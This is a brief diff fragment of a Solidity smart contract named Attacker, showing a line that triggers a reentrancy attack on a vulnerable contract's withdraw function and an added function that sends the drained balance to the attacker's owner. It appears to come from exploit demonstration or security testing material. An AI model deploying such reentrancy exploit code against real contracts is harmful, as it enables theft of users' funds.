@@ -28,4 +28,8 @@ contract Attacker {
         // Trigger reentrancy
         vul.withdraw(1 ether);
     }
+
+    function withdraw() external {
+        payable(owner).transfer(address(this).balance);
+    }
 }
